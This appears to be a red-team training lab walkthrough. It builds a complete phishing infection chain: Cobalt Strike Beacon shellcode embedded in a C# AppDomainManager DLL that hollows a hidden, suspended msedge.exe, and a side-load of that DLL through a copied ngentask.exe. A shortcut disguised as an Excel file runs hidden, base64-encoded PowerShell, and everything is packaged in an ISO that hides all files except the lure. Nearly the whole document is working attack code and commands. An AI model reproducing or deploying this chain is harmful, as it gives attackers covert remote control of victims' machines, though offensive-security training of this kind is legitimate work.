# Payload
1. Launch Cobalt Strike and connect to the team server.
2. Generate Beacon shellcode.
3. Go to **Payloads > Windows Stageless Payload**.
4. Listener: **http**
5. Output: **Raw**
6. Click **Generate**.
7. Save to _C:\Payloads\http_x64.xprocess.bin_.
8. Open a Terminal window and create a new directory to hold the dependencies for the infection chain.
9. mkdir C:\Payloads\deals
10. Open Visual Studio from the Windows taskbar.
![visual-studio.png](https://labondemand.blob.core.windows.net/content/lab216752/instructions347782/visual-studio.png)
11. Click 'Create a new project'
12. Choose the **Class Library (.NET Framework)** template.
> Make sure it specifically says **.NET Framework**, otherwise it won't work. ![dotnet-framework.png](https://labondemand.blob.core.windows.net/content/lab216752/instructions347782/dotnet-framework.png)

13. Configure the project:
14. Project name: AppDomainHijack.
15. Check the _place solution and project in the same directory_ box.
16. Add the shellcode to the project.
17. Right-click the project in the Solution Explorer and select **Add > Existing Item**.
18. Browse to _C:\Payloads_.
19. Change the file filter to _All Files_.
20. Select _http_x64.xprocess.bin_ and click **Add**.
21. Right-click the shellcode file in the Solution Explorer and select **Properties**.
22. Set its _Build Action_ to **Embedded Resource**.
23. Copy the following code into Class1.cs:

```csharp
using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
 
namespace AppDomainHijack
{
    public sealed class DomainManager : AppDomainManager
    {
        public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
        {
            var si = new STARTUPINFOA
            {
                cb = (uint)Marshal.SizeOf<STARTUPINFOA>(),
                dwFlags = STARTUPINFO_FLAGS.STARTF_USESHOWWINDOW
            };
 
            // create hidden + suspended msedge process
            var success = CreateProcessA(
                "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
                "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --no-startup-window",
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                PROCESS_CREATION_FLAGS.CREATE_NO_WINDOW | PROCESS_CREATION_FLAGS.CREATE_SUSPENDED,
                IntPtr.Zero,
                "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\",
                ref si,
                out var pi);
 
            if (!success)
                return;
 
            // get basic process information
            var szPbi = Marshal.SizeOf<PROCESS_BASIC_INFORMATION>();
            var lpPbi = Marshal.AllocHGlobal(szPbi);
 
            NtQueryInformationProcess(
                pi.hProcess,
                PROCESSINFOCLASS.ProcessBasicInformation,
                lpPbi,
                (uint)szPbi,
                out _);
 
            // marshal data to structure
            var pbi = Marshal.PtrToStructure<PROCESS_BASIC_INFORMATION>(lpPbi);
            Marshal.FreeHGlobal(lpPbi);
 
            // calculate pointer to image base address
            var lpImageBaseAddress = pbi.PebBaseAddress + 0x10;
 
            // buffer to hold data, 64-bit addresses are 8 bytes
            var bImageBaseAddress = new byte[8];
 
            // read data from spawned process
            ReadProcessMemory(
                pi.hProcess,
                lpImageBaseAddress,
                bImageBaseAddress,
                8,
                out _);
 
            // convert address bytes to pointer
            var baseAddress = (IntPtr)BitConverter.ToInt64(bImageBaseAddress, 0);
 
            // read pe headers
            var data = new byte[512];
 
            ReadProcessMemory(
                pi.hProcess,
                baseAddress,
                data,
                512,
                out _);
 
            // read e_lfanew
            var e_lfanew = BitConverter.ToInt32(data, 0x3C);
 
            // calculate rva
            var rvaOffset = e_lfanew + 0x28;
            var rva = BitConverter.ToUInt32(data, rvaOffset);
 
            // calculate address of entry point
            var lpEntryPoint = (IntPtr)((UInt64)baseAddress + rva);
 
            // read the shellcode
            byte[] shellcode;
 
            var assembly = Assembly.GetExecutingAssembly();
 
            using (var rs = assembly.GetManifestResourceStream("AppDomainHijack.http_x64.xprocess.bin"))
            {
                // convert stream to raw byte[]
                using (var ms = new MemoryStream())
                {
                    rs.CopyTo(ms);
                    shellcode = ms.ToArray();
                }
            }
 
            // copy shellcode into address of entry point
            WriteProcessMemory(
                pi.hProcess,
                lpEntryPoint,
                shellcode,
                shellcode.Length,
                out _);
 
            // resume process
            ResumeThread(pi.hThread);
        }
 
        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true, CharSet = CharSet.Ansi)]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        private static extern bool CreateProcessA(
            string applicationName,
            string commandLine,
            IntPtr processAttributes,
            IntPtr threadAttributes,
            bool inheritHandles,
            PROCESS_CREATION_FLAGS creationFlags,
            IntPtr environment,
            string currentDirectory,
            ref STARTUPINFOA startupInfo,
            out PROCESS_INFORMATION processInformation);
 
        [DllImport("ntdll.dll", ExactSpelling = true)]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        private static extern uint NtQueryInformationProcess(
            IntPtr processHandle,
            PROCESSINFOCLASS processInformationClass,
            IntPtr processInformation,
            uint processInformationLength,
            out uint returnLength);
 
        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        private static extern bool ReadProcessMemory(
            IntPtr processHandle,
            IntPtr baseAddress,
            byte[] buffer,
            UInt64 size,
            out uint numberOfBytesRead);
 
        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        private static extern bool WriteProcessMemory(
            IntPtr processHandle,
            IntPtr baseAddress,
            byte[] buffer,
            int size,
            out int numberOfBytesWritten);
 
        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        private static extern uint ResumeThread(IntPtr threadHandle);
    }
 
    [Flags]
    public enum PROCESS_CREATION_FLAGS : uint
    {
        DEBUG_PROCESS = 0x00000001,
        DEBUG_ONLY_THIS_PROCESS = 0x00000002,
        CREATE_SUSPENDED = 0x00000004,
        DETACHED_PROCESS = 0x00000008,
        CREATE_NEW_CONSOLE = 0x00000010,
        NORMAL_PRIORITY_CLASS = 0x00000020,
        IDLE_PRIORITY_CLASS = 0x00000040,
        HIGH_PRIORITY_CLASS = 0x00000080,
        REALTIME_PRIORITY_CLASS = 0x00000100,
        CREATE_NEW_PROCESS_GROUP = 0x00000200,
        CREATE_UNICODE_ENVIRONMENT = 0x00000400,
        CREATE_SEPARATE_WOW_VDM = 0x00000800,
        CREATE_SHARED_WOW_VDM = 0x00001000,
        CREATE_FORCEDOS = 0x00002000,
        BELOW_NORMAL_PRIORITY_CLASS = 0x00004000,
        ABOVE_NORMAL_PRIORITY_CLASS = 0x00008000,
        INHERIT_PARENT_AFFINITY = 0x00010000,
        INHERIT_CALLER_PRIORITY = 0x00020000,
        CREATE_PROTECTED_PROCESS = 0x00040000,
        EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
        PROCESS_MODE_BACKGROUND_BEGIN = 0x00100000,
        PROCESS_MODE_BACKGROUND_END = 0x00200000,
        CREATE_SECURE_PROCESS = 0x00400000,
        CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
        CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
        CREATE_DEFAULT_ERROR_MODE = 0x04000000,
        CREATE_NO_WINDOW = 0x08000000,
        PROFILE_USER = 0x10000000,
        PROFILE_KERNEL = 0x20000000,
        PROFILE_SERVER = 0x40000000,
        CREATE_IGNORE_SYSTEM_DEFAULT = 0x80000000
    }
 
    public struct STARTUPINFOA
    {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public STARTUPINFO_FLAGS dwFlags;
        public ushort wShowWindow;
        public ushort cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }
 
    [Flags]
    public enum STARTUPINFO_FLAGS : uint
    {
        STARTF_FORCEONFEEDBACK = 0x00000040,
        STARTF_FORCEOFFFEEDBACK = 0x00000080,
        STARTF_PREVENTPINNING = 0x00002000,
        STARTF_RUNFULLSCREEN = 0x00000020,
        STARTF_TITLEISAPPID = 0x00001000,
        STARTF_TITLEISLINKNAME = 0x00000800,
        STARTF_UNTRUSTEDSOURCE = 0x00008000,
        STARTF_USECOUNTCHARS = 0x00000008,
        STARTF_USEFILLATTRIBUTE = 0x00000010,
        STARTF_USEHOTKEY = 0x00000200,
        STARTF_USEPOSITION = 0x00000004,
        STARTF_USESHOWWINDOW = 0x00000001,
        STARTF_USESIZE = 0x00000002,
        STARTF_USESTDHANDLES = 0x00000100
    }
 
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }
 
    public enum PROCESSINFOCLASS
    {
        ProcessBasicInformation = 0
    }
 
    public struct PROCESS_BASIC_INFORMATION
    {
        public uint ExitStatus;
        public IntPtr PebBaseAddress;
        public ulong AffinityMask;
        public int BasePriority;
        public ulong UniqueProcessId;
        public ulong InheritedFromUniqueProcessId;
    }
}

```

> This is the process hollowing code from the Malware Essentials chapter.

24. Build the project in Release mode.
The DLL should be written to the following path: _C:\Users\Attacker\source\repos\AppDomainHijack\bin\Release\AppDomainHijack.dll_.

> If your path contains something like _net8.0_, then you chose the wrong project type on step 2.

25. Go ahead and copy the DLL to the deals payload directory.

```
cp C:\Users\Attacker\source\repos\AppDomainHijack\bin\Release\AppDomainHijack.dll C:\Payloads\deals\
```

# NGenTask

1. Copy the SxS version of ngentask.exe into the deals payload directory.
```
cp C:\Windows\WinSxS\amd64_netfx4-ngentask_exe_b03f5f7f11d50a3a_4.0.15805.0_none_d4039dd5692796db\ngentask.exe C:\Payloads\deals\
```

## Sanity test

1. Launch Cobalt Strike and connect to the team server.
2. Move into the deals payload directory and set the AppDomain environment variables:
```
cd C:\Payloads\deals
$env:APPDOMAIN_MANAGER_TYPE = 'AppDomainHijack.DomainManager'
$env:APPDOMAIN_MANAGER_ASM = 'AppDomainHijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null'
```
3. Run .\ngentask.exe
> A new Beacon should appear, running in msedge.exe.

# Trigger

Now for the trigger. The user will run this which will subsequently launch the decoy and payload at the same time.

1. Generate a PowerShell one-liner that will set the required environment variables and execute ngentask.exe.
```powershell
cd C:\Payloads\deals\
$cmd = '$env:APPDOMAIN_MANAGER_TYPE = "AppDomainHijack.DomainManager"; $env:APPDOMAIN_MANAGER_ASM = "AppDomainHijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null"; .\ngentask.exe'
$enc = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd))
```
2. In the same window, create the shortcut that will execute the above one-liner and open the decoy.
```powershell
$wsh = New-Object -ComObject WScript.Shell
$lnk = $wsh.CreateShortcut("C:\Payloads\deals\deals.xlsx.lnk")
$lnk.TargetPath = "%COMSPEC%"

# WITH DECOY
# $lnk.Arguments = "/C start deals.xlsx && %SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -enc $enc"

$lnk.Arguments = "/C %SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -enc $enc"
$lnk.IconLocation = "%ProgramFiles%\Microsoft Office\root\Office16\EXCEL.EXE,0"
$lnk.Save()
```

## Another sanity test

1. Open Explorer and navigate to _C:\Payloads\deals_.
2. Double-click on _deals.xlsx.lnk_.
> The spreadsheet will open and a new Beacon should appear at the same time.

# Container

It's time to package all of our files. We want to hide everything, except the lnk trigger.
https://github.com/mgeeky/PackMyPayload

1. Open Ubuntu (WSL) in Terminal, and use PackMyPayload to package all the files into an ISO.
```bash
python3 /mnt/c/Tools/PackMyPayload/PackMyPayload.py -H ngentask.exe,AppDomainHijack.dll /mnt/c/Payloads/deals/ /mnt/c/Payloads/deals/deals.iso
```
## Final sanity test

1. Double-click on the ISO to mount it and you should only see the trigger.
2. Double-click on the trigger a final time, and the decoy and Beacon should appear.